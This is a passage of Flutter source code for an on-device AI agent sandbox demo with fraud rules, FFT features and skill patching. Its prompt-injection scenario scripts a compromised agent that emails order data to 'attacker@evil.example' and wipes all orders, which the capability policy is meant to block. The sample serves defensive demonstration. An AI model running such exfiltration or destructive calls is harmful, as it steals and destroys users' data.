/// Interactive AI Agent & Neuro-Symbolic Execution Sandbox Lab for Quds Studio.
///
/// Demonstrates 5 real, executable on-device AI roles powered by
/// `package:quds/interpreter.dart`:
/// 1. CodeAct Programmatic Tool-Calling Agent (`host:ai_tools` + `quds:math`)
/// 2. Neuro-Symbolic Hybrid Fraud & Pricing Rules Engine (0% hallucination)
/// 3. Edge AI Sensor / FFT Feature Extraction Pipeline (`quds:math` + `quds:viz`)
/// 4. Prompt-Injection & DoS Defense Sandbox (`QudsCapability` + `QudsExecutionPolicy`)
/// 5. Self-Extending AI Skills via Atomic CodePush + Verifier Self-Healing Loop
library;

import 'dart:math' as math;

import 'package:flutter/material.dart';
import 'package:quds/interpreter.dart';

import 'compile_lab_panel.dart';
import 'viz2_widgets.dart';
import 'viz_widgets.dart';

/// Builds the capability-gated `host:ai_tools` host module exposed to AI-generated
/// Quds scripts inside the sandbox.
QudsHostModule buildAiToolsHostModule({
  List<String>? auditLog,
}) {
  return QudsHostModule.builder(
    'host:ai_tools',
    description:
        'Capability-gated application tool bridge for on-device Quds AI agents.',
  ).function(
    'listOrders',
    (pos, named, ctx) {
      final days = pos.isNotEmpty ? (pos[0] as num).toInt() : 30;
      auditLog?.add('ALLOW ai.orders.read -> listOrders($days)');
      return [
        {
          'id': 'ORD-101',
          'category': 'Electronics',
          'total': 1240.0,
          'status': 'paid',
          'country': 'SA',
          'velocity': 1,
          'newDevice': false,
        },
        {
          'id': 'ORD-102',
          'category': 'Electronics',
          'total': 2890.0,
          'status': 'paid',
          'country': 'AE',
          'velocity': 5,
          'newDevice': true,
        },
        {
          'id': 'ORD-103',
          'category': 'Books',
          'total': 85.0,
          'status': 'paid',
          'country': 'JO',
          'velocity': 1,
          'newDevice': false,
        },
        {
          'id': 'ORD-104',
          'category': 'Home',
          'total': 460.0,
          'status': 'paid',
          'country': 'SA',
          'velocity': 2,
          'newDevice': false,
        },
        {
          'id': 'ORD-105',
          'category': 'Electronics',
          'total': 5400.0,
          'status': 'paid',
          'country': 'XX',
          'velocity': 9,
          'newDevice': true,
        },
        {
          'id': 'ORD-106',
          'category': 'Home',
          'total': 320.0,
          'status': 'refunded',
          'country': 'EG',
          'velocity': 1,
          'newDevice': false,
        },
        {
          'id': 'ORD-107',
          'category': 'Fashion',
          'total': 790.0,
          'status': 'paid',
          'country': 'KW',
          'velocity': 2,
          'newDevice': false,
        },
        {
          'id': 'ORD-108',
          'category': 'Fashion',
          'total': 1650.0,
          'status': 'paid',
          'country': 'QA',
          'velocity': 4,
          'newDevice': true,
        },
      ];
    },
    capability: 'ai.orders.read',
    signature: 'listOrders(days: int) -> List<Map>',
    documentation: 'Reads recent order records locally on-device.',
  ).function(
    'readSignal',
    (pos, named, ctx) {
      final n = pos.isNotEmpty ? (pos[0] as num).toInt().clamp(16, 1024) : 128;
      auditLog?.add('ALLOW ai.sensors.read -> readSignal($n)');
      final out = <double>[];
      for (var i = 0; i < n; i++) {
        final t = i / n;
        // Two strong harmonics (freq bin 7 & bin 19) + deterministic micro-noise
        final s = 2.4 * math.sin(2.0 * math.pi * 7.0 * t) +
            1.1 * math.cos(2.0 * math.pi * 19.0 * t) +
            0.25 * math.sin(2.0 * math.pi * 31.0 * t + 0.4);
        out.add(s);
      }
      return out;
    },
    capability: 'ai.sensors.read',
    signature: 'readSignal(samples: int) -> List<double>',
    documentation: 'Reads local vibration/biosignal waveform for Edge AI.',
  ).function(
    'sendEmailAlert',
    (pos, named, ctx) {
      final to = pos.isNotEmpty ? '${pos[0]}' : 'ops@company.com';
      final subj = pos.length > 1 ? '${pos[1]}' : 'Alert';
      auditLog?.add('ALLOW ai.email.send -> sendEmailAlert($to, "$subj")');
      return 'Queued email to $to: $subj';
    },
    capability: 'ai.email.send',
    signature: 'sendEmailAlert(to: String, subject: String) -> String',
    documentation: 'Sends an outbound email notification (restricted).',
  ).function(
    'deleteAllOrders',
    (pos, named, ctx) {
      auditLog?.add('ALLOW ai.orders.delete -> deleteAllOrders()');
      return 'DELETED_ALL_ORDERS';
    },
    capability: 'ai.orders.delete',
    signature: 'deleteAllOrders() -> String',
    documentation:
        'Destructive database wipe (always blocked in safe AI mode).',
  ).build();
}

/// Multi-folder AI Agent Workspace combining CodeAct, Neuro-Symbolic rules, and
/// Edge AI FFT signal preprocessing across 5 nested folders.
QudsWorkspace buildAiAgentSandboxProject() => QudsWorkspace(
      name: 'quds_ai_agent_sandbox',
      packageName: 'quds_ai_agent_sandbox',
      entryPoint: 'main.quds',
      bundleVersion: '1.0.0',
      files: {
        'assets/agent_manifest.json': '''{
  "agent": "Quds On-Device AI Executive",
  "mode": "Neuro-Symbolic + CodeAct",
  "allowedCapabilities": ["ai.orders.read", "ai.sensors.read"],
  "blockedCapabilities": ["ai.email.send", "ai.orders.delete"],
  "skills": [
    "skills/analytics/orders_skill.quds",
    "skills/neuro_symbolic/fraud_rules.quds",
    "skills/edge_ai/signal_features.quds"
  ]
}
''',
        'core/policy/thresholds.quds':
            '''# Deterministic risk & feature thresholds (edit live via CodePush!)
HIGH_VALUE_THRESHOLD = 1500.0
MAX_SAFE_VELOCITY = 4
BLOCK_SCORE = 70
REVIEW_SCORE = 40
SIGNAL_SAMPLES = 128
''',
        'skills/analytics/orders_skill.quds':
            '''# Skill 1: CodeAct Programmatic Analytics (1 script replaces 10+ LLM tool calls)
use quds:math show mean, median, percentile, stddev

summarizePaidOrders(orders: List) -> Map:
  var totals = []
  var byCat = map:
  for o in orders:
    if o["status"] == "paid":
      t = o["total"] to double
      totals.add(t)
      cat = o["category"].toString()
      prev = byCat[cat]
      if prev == null:
        byCat[cat] = t
      else:
        byCat[cat] = (prev to double) + t
  return map:
    "paidCount": totals.length
    "mean": mean(totals)
    "median": median(totals)
    "p95": percentile(totals, 95.0)
    "stddev": stddev(totals)
    "byCategory": byCat
''',
        'skills/neuro_symbolic/fraud_rules.quds':
            '''# Skill 2: Neuro-Symbolic Deterministic Risk Scorer (zero LLM math hallucination)
use ^^.core.policy.thresholds show HIGH_VALUE_THRESHOLD, MAX_SAFE_VELOCITY, BLOCK_SCORE, REVIEW_SCORE

evaluateOrderRisk(order: Map) -> Map:
  var score = 0
  var reasons = []
  amount = order["total"] to double
  vel = order["velocity"] to int
  newDev = order["newDevice"] == true
  country = order["country"].toString()

  if amount >= HIGH_VALUE_THRESHOLD:
    score = score + 35
    reasons.add("HighAmount")
  if vel > MAX_SAFE_VELOCITY:
    score = score + 30
    reasons.add("HighVelocity")
  if newDev:
    score = score + 20
    reasons.add("NewDevice")
  if country == "XX":
    score = score + 25
    reasons.add("UnknownGeo")

  var decision = "ALLOW"
  if score >= BLOCK_SCORE:
    decision = "BLOCK"
  else if score >= REVIEW_SCORE:
    decision = "REVIEW"

  return map:
    "id": order["id"]
    "score": score
    "decision": decision
    "reasons": reasons.join(", ")
''',
        'skills/edge_ai/signal_features.quds':
            '''# Skill 3: Edge AI Local Signal & FFT Feature Extraction (before TFLite/ONNX)
use quds:math show fftReal, mean, stddev

extractSpectrumFeatures(samples: List) -> Map:
  spec = fftReal(samples)
  half = samples.length ~/ 2
  var freqs = []
  var mags = []
  var peakFreq = 0
  var peakMag = -1.0
  var k = 1
  while k < half:
    c = spec[k]
    mag = c.abs()
    freqs.add(k to double)
    mags.add(mag)
    if mag > peakMag:
      peakMag = mag
      peakFreq = k
    k = k + 1
  return map:
    "mean": mean(samples)
    "stddev": stddev(samples)
    "peakFreq": peakFreq
    "peakMag": peakMag
    "freqs": freqs
    "mags": mags
''',
        'skills/index.quds': '''# Barrel facade exporting all AI agent skills
export analytics.orders_skill show summarizePaidOrders
export neuro_symbolic.fraud_rules show evaluateOrderRisk
export edge_ai.signal_features show extractSpectrumFeatures
''',
        'main.quds': '''# Multi-Skill On-Device AI Agent Executive
use quds:viz as viz
use host:ai_tools as tools
use core.policy.thresholds show SIGNAL_SAMPLES
use skills.index as ai

orders = tools.listOrders(30)
stats = ai.summarizePaidOrders(orders)

var riskRows = []
var blocked = 0
var reviewed = 0
for o in orders:
  if o["status"] == "paid":
    r = ai.evaluateOrderRisk(o)
    if r["decision"] == "BLOCK":
      blocked = blocked + 1
    else if r["decision"] == "REVIEW":
      reviewed = reviewed + 1
    riskRows.add([
      r["id"].toString(),
      "{o['total']} USD",
      "{r['score']} / 100",
      r["decision"].toString(),
      r["reasons"].toString(),
    ])

signal = tools.readSignal(SIGNAL_SAMPLES)
feat = ai.extractSpectrumFeatures(signal)

viz.table(
  ["الطلب / Order", "المبلغ", "النقاط", "القرار", "الأسباب"],
  riskRows,
  title: "🧠 Neuro-Symbolic Risk Decisions (0% Hallucination)",
)

viz.plot(
  feat["freqs"],
  feat["mags"],
  title: "📡 Edge AI FFT Spectrum (Peak Bin = {feat['peakFreq']})",
  xLabel: "Frequency Bin",
  yLabel: "Magnitude",
  color: "#38BDF8",
)

summary = map:
  "الطلبات المدفوعة": stats["paidCount"]
  "متوسط الطلب": "{stats['mean'].toStringAsFixed(2)} USD"
  "الوسيط / P95": "{stats['median'].toStringAsFixed(0)} / {stats['p95'].toStringAsFixed(0)} USD"
  "حالات BLOCK / REVIEW": "{blocked} BLOCK · {reviewed} REVIEW"
  "التردد المهيمن (Edge FFT)": "Bin {feat['peakFreq']} (mag={feat['peakMag'].toStringAsFixed(1)})"

viz.form(
  summary,
  title: "🤖 ملخص وكيل الذكاء الاصطناعي المحلي (CodeAct + Neuro-Symbolic + Edge AI)",
  summary: "نُفّذ بالكامل محليًا داخل Sandbox بصلاحيات قراءة فقط — دون إرسال أي بيانات للسحابة",
)

print "AI Agent OK | paid={stats['paidCount']} | avg={stats['mean'].toStringAsFixed(2)} | blocked={blocked} | peakBin={feat['peakFreq']}"
''',
      },
    );

class _AiScenario {
  const _AiScenario({
    required this.id,
    required this.titleAr,
    required this.titleEn,
    required this.promptAr,
    required this.promptEn,
    required this.roleBadgeAr,
    required this.roleBadgeEn,
    required this.icon,
    required this.accent,
    required this.code,
    this.isSelfHealingDemo = false,
  });

  final String id;
  final String titleAr;
  final String titleEn;
  final String promptAr;
  final String promptEn;
  final String roleBadgeAr;
  final String roleBadgeEn;
  final IconData icon;
  final Color accent;
  final String code;
  final bool isSelfHealingDemo;
}

const List<_AiScenario> _aiScenarios = [
  _AiScenario(
    id: 'codeact_tools',
    titleAr: '1. وكيل استدعاء الأدوات (CodeAct)',
    titleEn: '1. CodeAct Tool-Calling Agent',
    promptAr:
        '«حلّل طلبات آخر 30 يومًا محليًا، احسب المتوسط والوسيط وP95 والانحراف المعياري، ولخّص الإيراد لكل فئة في جولة واحدة»',
    promptEn:
        '"Analyze the last 30 days of orders locally, compute mean/median/P95/stddev, and group revenue by category in a single tool script."',
    roleBadgeAr: 'جولة LLM واحدة بدل 12 استدعاء JSON',
    roleBadgeEn: '1 LLM turn instead of 12 JSON tool calls',
    icon: Icons.smart_toy_rounded,
    accent: Color(0xFF38BDF8),
    code: '''# AI-generated CodeAct script executed locally inside Quds Sandbox
use host:ai_tools as tools
use quds:math show mean, median, percentile, stddev
use quds:viz as viz

orders = tools.listOrders(30)
var paidTotals = []
var catTotals = map:
for o in orders:
  if o["status"] == "paid":
    amt = o["total"] to double
    paidTotals.add(amt)
    cat = o["category"].toString()
    prev = catTotals[cat]
    if prev == null:
      catTotals[cat] = amt
    else:
      catTotals[cat] = (prev to double) + amt

var rows = []
for cat in catTotals.keys:
  v = catTotals[cat] to double
  rows.add([cat.toString(), "{v.toStringAsFixed(2)} USD"])

viz.table(["الفئة / Category", "إجمالي الإيراد"], rows, title: "🤖 نتائج CodeAct Agent — جولة واحدة")
summary = map:
  "الطلبات المدفوعة": paidTotals.length
  "المتوسط (Mean)": "{mean(paidTotals).toStringAsFixed(2)} USD"
  "الوسيط (Median)": "{median(paidTotals).toStringAsFixed(2)} USD"
  "النسبة 95% (P95)": "{percentile(paidTotals, 95.0).toStringAsFixed(2)} USD"
  "الانحراف المعياري": "{stddev(paidTotals).toStringAsFixed(2)} USD"
viz.form(summary, title: "📊 إحصاءات دقيقة 100% بدون هلوسة LLM")

print "CodeAct done | paid={paidTotals.length} | mean={mean(paidTotals).toStringAsFixed(2)} | p95={percentile(paidTotals, 95.0).toStringAsFixed(2)}"
''',
  ),
  _AiScenario(
    id: 'neuro_symbolic',
    titleAr: '2. ذكاء هجين (Neuro-Symbolic)',
    titleEn: '2. Neuro-Symbolic Fraud Rules',
    promptAr:
        '«قيّم مخاطر المعاملات المستخرجة من النموذج بقواعد حتمية 100% (ALLOW / REVIEW / BLOCK) مع تفسير سبب كل قرار»',
    promptEn:
        '"Score LLM-extracted transactions with 100% deterministic fraud rules (ALLOW / REVIEW / BLOCK) and explain every decision."',
    roleBadgeAr: 'قرار حتمي وقابل للتدقيق (0% هلوسة)',
    roleBadgeEn: 'Auditable deterministic policy (0% hallucination)',
    icon: Icons.psychology_rounded,
    accent: Color(0xFF10B981),
    code:
        '''# Neuro-Symbolic Hybrid: LLM extracts entities -> Quds enforces exact rules
use host:ai_tools as tools
use quds:viz as viz

scoreOrder(o: Map) -> Map:
  var risk = 0
  var flags = []
  amt = o["total"] to double
  vel = o["velocity"] to int
  if amt >= 1500.0:
    risk = risk + 35
    flags.add("HighAmount")
  if vel > 4:
    risk = risk + 30
    flags.add("VelocitySpike")
  if o["newDevice"] == true:
    risk = risk + 20
    flags.add("NewDevice")
  if o["country"].toString() == "XX":
    risk = risk + 25
    flags.add("UnknownGeo")
  decision = risk >= 70 ? "BLOCK" : (risk >= 40 ? "REVIEW" : "ALLOW")
  return map:
    "id": o["id"]
    "risk": risk
    "decision": decision
    "flags": flags.isEmpty ? "Clean" : flags.join(", ")

orders = tools.listOrders(30)
var rows = []
var blocked = 0
var reviewed = 0
for o in orders:
  if o["status"] == "paid":
    r = scoreOrder(o)
    if r["decision"] == "BLOCK":
      blocked = blocked + 1
    else if r["decision"] == "REVIEW":
      reviewed = reviewed + 1
    rows.add([r["id"].toString(), "{o['total']} USD", "{r['risk']}/100", r["decision"].toString(), r["flags"].toString()])

viz.table(["الطلب", "المبلغ", "المخاطرة", "القرار", "الأسباب"], rows, title: "🧠 Neuro-Symbolic Risk Engine")
print "Neuro-Symbolic evaluated {rows.length} paid orders | BLOCK={blocked} | REVIEW={reviewed}"
''',
  ),
  _AiScenario(
    id: 'edge_ai_fft',
    titleAr: '3. معالجة إشارات Edge AI (FFT)',
    titleEn: '3. Edge AI FFT Feature Pipeline',
    promptAr:
        '«التقط 128 عينة من حساس الاهتزاز، نفّذ تحويل فورييه السريع FFT محليًا، واستخرج الترددات المهيمنة لتغذية نموذج TFLite»',
    promptEn:
        '"Capture 128 local vibration samples, run native FFT on-device, and extract dominant frequency features for a local TFLite model."',
    roleBadgeAr: '80 دالة أصلية (4.5× أسرع من Python)',
    roleBadgeEn: '80 native intrinsics (4.5x faster than Python)',
    icon: Icons.graphic_eq_rounded,
    accent: Color(0xFF8B5CF6),
    code:
        '''# Edge AI Feature Extraction executed at near-native speed via quds:math FFT
use host:ai_tools as tools
use quds:math show fftReal, mean, stddev
use quds:viz as viz

samples = tools.readSignal(128)
spectrum = fftReal(samples)

var bins = []
var mags = []
var top1Bin = 0
var top1Mag = -1.0
var top2Bin = 0
var top2Mag = -1.0

var k = 1
while k < 64:
  m = spectrum[k].abs()
  bins.add(k to double)
  mags.add(m)
  if m > top1Mag:
    top2Mag = top1Mag
    top2Bin = top1Bin
    top1Mag = m
    top1Bin = k
  else if m > top2Mag:
    top2Mag = m
    top2Bin = k
  k = k + 1

viz.plot(
  bins,
  mags,
  title: "📡 Edge AI FFT Feature Spectrum (Top: Bin {top1Bin} & Bin {top2Bin})",
  xLabel: "Frequency Bin",
  yLabel: "|FFT(k)|",
  color: "#8B5CF6",
)

features = map:
  "عدد العينات": samples.length
  "المتوسط (Mean)": mean(samples).toStringAsFixed(4)
  "الانحراف (StdDev)": stddev(samples).toStringAsFixed(4)
  "التردد المهيمن #1": "Bin {top1Bin} (mag={top1Mag.toStringAsFixed(1)})"
  "التردد المهيمن #2": "Bin {top2Bin} (mag={top2Mag.toStringAsFixed(1)})"
  "جاهز لنموذج TFLite": "[{mean(samples).toStringAsFixed(3)}, {stddev(samples).toStringAsFixed(3)}, {top1Bin}, {top2Bin}]"

viz.form(features, title: "⚡ Feature Vector جاهز للذكاء الاصطناعي المحلي")
print "Edge FFT ready | peak1=bin{top1Bin} ({top1Mag.toStringAsFixed(1)}) | peak2=bin{top2Bin} ({top2Mag.toStringAsFixed(1)})"
''',
  ),
  _AiScenario(
    id: 'prompt_injection',
    titleAr: '4. صدّ هجوم حقن الأوامر (Security)',
    titleEn: '4. Prompt-Injection Defense',
    promptAr:
        '«⚠️ هجوم حقن أوامر خبيث: يحاول الوكيل حذف جميع الطلبات وإرسال البيانات لبريد خارجي — راقب سياسة QudsCapability تمنعه فورًا!»',
    promptEn:
        '"⚠️ Adversarial prompt injection: AI tries to wipe all orders and exfiltrate data via email — watch QudsCapability block it instantly!"',
    roleBadgeAr: 'عزل صلاحيات حي (جرّب تفعيل/إيقاف الصلاحيات)',
    roleBadgeEn: 'Live capability guard (toggle permissions below)',
    icon: Icons.shield_rounded,
    accent: Color(0xFFEF4444),
    code:
        '''# Simulated Prompt-Injection payload generated by a compromised AI agent
use host:ai_tools as tools

# Step 1: Legitimate read (allowed when ai.orders.read is granted)
orders = tools.listOrders(7)
print "Read {orders.length} orders..."

# Step 2: Unauthorized exfiltration attempt (requires ai.email.send)
msg = tools.sendEmailAlert("attacker@evil.example", "Exfiltrated {orders.length} orders")
print msg

# Step 3: Destructive attack (requires ai.orders.delete — ALWAYS denied!)
wiped = tools.deleteAllOrders()
print wiped
''',
  ),
  _AiScenario(
    id: 'self_healing_skill',
    titleAr: '5. مهارة جديدة + تصحيح ذاتي (CodePush)',
    titleEn: '5. Self-Extending Skill + Verifier',
    promptAr:
        '«يبني الـ AI مهارة جديدة skills/loyalty/vip.quds: المحاولة 1 فيها خطأ نحوي يرفضه المفسر ذريًا، ثم يتلقى التشخيص ويصلحها ويترجمها إلى .qbc!»',
    promptEn:
        '"AI authors a new skill skills/loyalty/vip.quds: Attempt 1 has a syntax bug rejected atomically, then the verifier feeds diagnostics back so Attempt 2 compiles to .qbc & runs!"',
    roleBadgeAr: 'تحقق ذري + تصحيح ذاتي + كاش .qbc',
    roleBadgeEn: 'Atomic rollback + verifier loop + .qbc cache',
    icon: Icons.auto_fix_high_rounded,
    accent: Color(0xFFF59E0B),
    isSelfHealingDemo: true,
    code:
        '''# Skill generated & verified via Quds Atomic CodePush (skills/loyalty/vip.quds)
vipDiscount(total: double, ordersCount: int) -> double:
  if ordersCount >= 5 and total >= 1000.0:
    return total * 0.85
  if ordersCount >= 3:
    return total * 0.92
  return total
''',
  ),
];

/// Full-screen interactive AI Agent Sandbox Lab inside Quds Studio.
class QudsAiAgentLabPage extends StatefulWidget {
  const QudsAiAgentLabPage({
    super.key,
    required this.isArabic,
    required this.isDark,
    this.onOpenAiWorkspaceInStudio,
  });

  final bool isArabic;
  final bool isDark;
  final VoidCallback? onOpenAiWorkspaceInStudio;

  @override
  State<QudsAiAgentLabPage> createState() => _QudsAiAgentLabPageState();
}

class _QudsAiAgentLabPageState extends State<QudsAiAgentLabPage> {
  int _selectedIdx = 0;
  late TextEditingController _codeController;
  bool _running = false;
  bool _allowOrdersRead = true;
  bool _allowSensorsRead = true;
  bool _allowEmailSend = false;
  bool _allowOrdersDelete = false;

  QudsRunResult? _result;
  List<String> _auditLog = const [];
  List<String> _selfHealTimeline = const [];
  QudsCompiledArtifactInfo? _generatedSkillArtifact;

  _AiScenario get _scenario => _aiScenarios[_selectedIdx];

  @override
  void initState() {
    super.initState();
    _codeController = TextEditingController(text: _scenario.code);
  }

  @override
  void dispose() {
    _codeController.dispose();
    super.dispose();
  }

  void _selectScenario(int index) {
    setState(() {
      _selectedIdx = index;
      _codeController.text = _aiScenarios[index].code;
      _result = null;
      _auditLog = const [];
      _selfHealTimeline = const [];
      _generatedSkillArtifact = null;
    });
  }

  Future<void> _runScenario() async {
    if (_running) return;
    setState(() {
      _running = true;
      _auditLog = const [];
      _selfHealTimeline = const [];
      _generatedSkillArtifact = null;
    });
    await Future<void>.delayed(const Duration(milliseconds: 16));
    if (!mounted) return;

    if (_scenario.isSelfHealingDemo) {
      await _runSelfHealingSkillLoop();
      return;
    }

    final audit = <String>[];
    final caps = <QudsCapability>[
      if (_allowOrdersRead) QudsCapability.custom('ai.orders.read'),
      if (_allowSensorsRead) QudsCapability.custom('ai.sensors.read'),
      if (_allowEmailSend) QudsCapability.custom('ai.email.send'),
      if (_allowOrdersDelete) QudsCapability.custom('ai.orders.delete'),
    ];
    final policy = QudsExecutionPolicy.systemBridge(
      capabilities: caps,
      maxSteps: 500000,
      timeout: const Duration(seconds: 10),
    );
    final session = QudsSession(
      policy: policy,
      allowTopLevelRebind: true,
      hostModules: [buildAiToolsHostModule(auditLog: audit)],
    );
    try {
      final res = await session.run(
        _codeController.text,
        file: '${_scenario.id}.quds',
        preferBytecode: true,
      );
      if (!res.succeeded && res.error is QudsPolicyViolationException) {
        final err = res.error as QudsPolicyViolationException;
        audit.add('BLOCKED [${err.kind.name}] -> ${err.message}');
      }
      if (!mounted) return;
      setState(() {
        _running = false;
        _result = res;
        _auditLog = audit;
      });
    } finally {
      await session.dispose();
    }
  }

  Future<void> _runSelfHealingSkillLoop() async {
    final timeline = <String>[];
    final audit = <String>[];
    final ws = buildAiAgentSandboxProject();
    final policy = QudsExecutionPolicy.systemBridge(
      capabilities: [
        QudsCapability.custom('ai.orders.read'),
        QudsCapability.custom('ai.sensors.read'),
      ],
      maxSteps: 500000,
      timeout: const Duration(seconds: 10),
    );
    final session = QudsSession(
      policy: policy,
      allowTopLevelRebind: true,
      projectWorkspace: ws,
      hostModules: [buildAiToolsHostModule(auditLog: audit)],
    );
    try {
      session.precompileWorkspace();
      final beforeRev = ws.revision;
      timeline.add(widget.isArabic
          ? '① الحالة الأولية: ${session.compiledWorkspaceArtifacts.length} ملفات مهارات مترجمة في .quds_cache/ (rev=$beforeRev)'
          : '1. Baseline: ${session.compiledWorkspaceArtifacts.length} precompiled skills in .quds_cache/ (rev=$beforeRev)');

      // Attempt 1: Broken syntax generated by AI -> Atomic rejection!
      final badPatch = await session.applyWorkspacePatch(
        const QudsWorkspacePatch(
          bundleVersion: '1.1.0-ai-attempt1',
          upsertFiles: {
            'skills/loyalty/vip.quds':
                'vipDiscount(total: double, ordersCount: int -> :\n  return @@@\n',
          },
        ),
        validateSyntax: true,
        atomicRollback: true,
      );
      final firstErr =
          badPatch.errors.isNotEmpty ? badPatch.errors.first : 'Syntax error';
      audit.add('ATOMIC REJECT v1.1.0-ai-attempt1 -> $firstErr');
      timeline.add(widget.isArabic
          ? '② محاولة AI #1 (كود معطوب): رُفض التحديث ذريًا (applied=${badPatch.applied}, rev=${ws.revision}) — التشخيص المرجَع للنموذج: $firstErr'
          : '2. AI Attempt #1 (broken code): Atomically rejected (applied=${badPatch.applied}, rev=${ws.revision}) — diagnostic fed back: $firstErr');

      // Attempt 2: AI fixes code using the exact span error & pushes clean skill!
      final fixedCode = _codeController.text;
      final goodPatch = await session.applyWorkspacePatch(
        QudsWorkspacePatch(
          bundleVersion: '1.1.0-ai-healed',
          upsertFiles: {
            'skills/loyalty/vip.quds': fixedCode,
            'skills/index.quds': '''
export analytics.orders_skill show summarizePaidOrders
export neuro_symbolic.fraud_rules show evaluateOrderRisk
export edge_ai.signal_features show extractSpectrumFeatures
export loyalty.vip show vipDiscount
''',
            'main.quds': '''
use quds:viz as viz
use skills.index show vipDiscount

v1 = vipDiscount(1200.0, 6)
v2 = vipDiscount(500.0, 3)
v3 = vipDiscount(300.0, 1)

viz.table(
  ["العميل", "المبلغ الأصلي", "عدد الطلبات", "السعر بعد مهارة AI الجديدة"],
  [
    ["VIP Gold", "1200.00 USD", "6", "{v1.toStringAsFixed(2)} USD (-15%)"],
    ["Loyal Silver", "500.00 USD", "3", "{v2.toStringAsFixed(2)} USD (-8%)"],
    ["Standard", "300.00 USD", "1", "{v3.toStringAsFixed(2)} USD (0%)"],
  ],
  title: "🧬 مهارة AI الجديدة بعد التصحيح الذاتي (skills/loyalty/vip.qbc)",
)
print "Self-Healed Skill OK | VIP(1200,6)={v1.toStringAsFixed(2)} | Silver(500,3)={v2.toStringAsFixed(2)} | Std(300,1)={v3.toStringAsFixed(2)}"
''',
          },
        ),
        validateSyntax: true,
        atomicRollback: true,
        precompileAffected: true,
      );
      audit.add(
          'ATOMIC APPLY v1.1.0-ai-healed -> recompiled ${goodPatch.recompiledFiles.join(', ')}');
      timeline.add(widget.isArabic
          ? '③ محاولة AI #2 (بعد التصحيح الذاتي): تم اعتماد المهارة وترجمة ${goodPatch.recompiledFiles.length} ملفات فقط إلى .qbc (rev=${ws.revision})!'
          : '3. AI Attempt #2 (self-healed): Applied & compiled ${goodPatch.recompiledFiles.length} affected files to .qbc (rev=${ws.revision})!');

      final res = await session.runProject(preferBytecode: true);
      final skillArtifact =
          session.inspectCompiledWorkspaceFile('skills/loyalty/vip.quds');
      if (skillArtifact != null) {
        timeline.add(widget.isArabic
            ? '④ الملف المترجم الناتج: ${skillArtifact.compiledPath} (${skillArtifact.tier1Promoted ? "⚡ Tier-1 Register VM" : "Universal VM"} · ${formatByteSize(skillArtifact.estimatedBytecodeBytes)} · #${skillArtifact.fingerprint.substring(0, 8)})'
            : '4. Generated artifact: ${skillArtifact.compiledPath} (${skillArtifact.tier1Promoted ? "⚡ Tier-1 Register VM" : "Universal VM"} · ${formatByteSize(skillArtifact.estimatedBytecodeBytes)} · #${skillArtifact.fingerprint.substring(0, 8)})');
      }

      if (!mounted) return;
      setState(() {
        _running = false;
        _result = res;
        _auditLog = audit;
        _selfHealTimeline = timeline;
        _generatedSkillArtifact = skillArtifact;
      });
    } finally {
      await session.dispose();
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    final isAr = widget.isArabic;
    final cardBg =
        widget.isDark ? const Color(0xFF0F172A) : const Color(0xFFF8FAFC);
    final codeBg =
        widget.isDark ? const Color(0xFF020617) : const Color(0xFF0F172A);
    final res = _result;

    return Directionality(
      textDirection: isAr ? TextDirection.rtl : TextDirection.ltr,
      child: Scaffold(
        key: const Key('ai_agent_lab_page'),
        appBar: AppBar(
          titleSpacing: 8,
          title: Row(
            children: [
              const Icon(Icons.smart_toy_rounded,
                  size: 20, color: Color(0xFF38BDF8)),
              const SizedBox(width: 8),
              Expanded(
                child: Text(
                  isAr
                      ? 'مختبر الذكاء الاصطناعي داخل Quds Sandbox'
                      : 'Quds On-Device AI Agent Lab',
                  style: const TextStyle(
                      fontSize: 15, fontWeight: FontWeight.w700),
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            ],
          ),
          actions: [
            if (widget.onOpenAiWorkspaceInStudio != null)
              TextButton.icon(
                key: const Key('ai_lab_open_workspace_btn'),
                onPressed: () {
                  Navigator.of(context).pop();
                  widget.onOpenAiWorkspaceInStudio!();
                },
                icon: const Icon(Icons.folder_copy_rounded, size: 15),
                label: Text(
                  isAr ? 'افتح المشروع الكامل' : 'Open Full Project',
                  style: const TextStyle(fontSize: 11.5),
                ),
              ),
          ],
        ),
        body: ListView(
          padding: const EdgeInsets.all(12),
          children: [
            // Scenario selector chips
            SingleChildScrollView(
              scrollDirection: Axis.horizontal,
              child: Row(
                children: [
                  for (var i = 0; i < _aiScenarios.length; i++) ...[
                    if (i > 0) const SizedBox(width: 6),
                    ChoiceChip(
                      key: Key('ai_scenario_${_aiScenarios[i].id}'),
                      selected: i == _selectedIdx,
                      avatar: Icon(
                        _aiScenarios[i].icon,
                        size: 15,
                        color: i == _selectedIdx
                            ? Colors.white
                            : _aiScenarios[i].accent,
                      ),
                      selectedColor: _aiScenarios[i].accent,
                      label: Text(
                        isAr
                            ? _aiScenarios[i].titleAr
                            : _aiScenarios[i].titleEn,
                        style: TextStyle(
                          fontSize: 11.5,
                          fontWeight: FontWeight.w700,
                          color: i == _selectedIdx ? Colors.white : null,
                        ),
                      ),
                      onSelected: (_) => _selectScenario(i),
                    ),
                  ],
                ],
              ),
            ),
            const SizedBox(height: 10),

            // Prompt card
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: cardBg,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: _scenario.accent.withValues(alpha: 0.4),
                ),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  Row(
                    children: [
                      Icon(_scenario.icon, size: 18, color: _scenario.accent),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Text(
                          isAr ? _scenario.titleAr : _scenario.titleEn,
                          style: const TextStyle(
                            fontSize: 13.5,
                            fontWeight: FontWeight.w800,
                          ),
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 8, vertical: 3),
                        decoration: BoxDecoration(
                          color: _scenario.accent.withValues(alpha: 0.16),
                          borderRadius: BorderRadius.circular(999),
                        ),
                        child: Text(
                          isAr ? _scenario.roleBadgeAr : _scenario.roleBadgeEn,
                          style: TextStyle(
                            fontSize: 10,
                            fontWeight: FontWeight.w700,
                            color: _scenario.accent,
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 6),
                  Text(
                    isAr ? _scenario.promptAr : _scenario.promptEn,
                    style: TextStyle(
                      fontSize: 12,
                      color: theme.textTheme.bodyMedium?.color
                          ?.withValues(alpha: 0.88),
                      height: 1.4,
                    ),
                  ),
                  const SizedBox(height: 10),

                  // Capability policy toggles
                  if (!_scenario.isSelfHealingDemo) ...[
                    Text(
                      isAr
